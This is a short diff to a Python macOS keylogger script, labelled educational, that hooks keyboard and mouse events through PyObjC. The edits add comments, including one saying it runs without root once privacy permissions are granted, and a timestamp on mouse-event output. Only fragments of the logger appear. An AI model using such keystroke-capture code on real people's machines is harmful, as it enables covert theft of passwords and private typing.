@@ -8,6 +8,8 @@ If executed successfully this script will log key strokes until the process is k
 This script is for EDUCATIONAL PURPOSES ONLY. 
 """
 
+# can be run without root, but must enable the privilege in privacy settings
+
 import os, sys
 
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -15,8 +17,8 @@ from AppKit import NSApplication, NSApp
 from Foundation import NSObject
 from Cocoa import (
     NSEvent,
-    NSKeyDownMask,
-    NSLeftMouseUpMask,
+    NSKeyDownMask, # keyboard
+    NSLeftMouseUpMask, # mouse
     NSLeftMouseDownMask,
     NSLeftMouseDraggedMask,
     NSRightMouseDownMask,
@@ -56,7 +58,8 @@ class AppDelegate(NSObject):
 
 # w = Writer()
 def mouse_handler(event):
-    print("mouse have actions")
+    import time
+    print("mouse have actions", time.time())
 
 
 def key_handler(event):
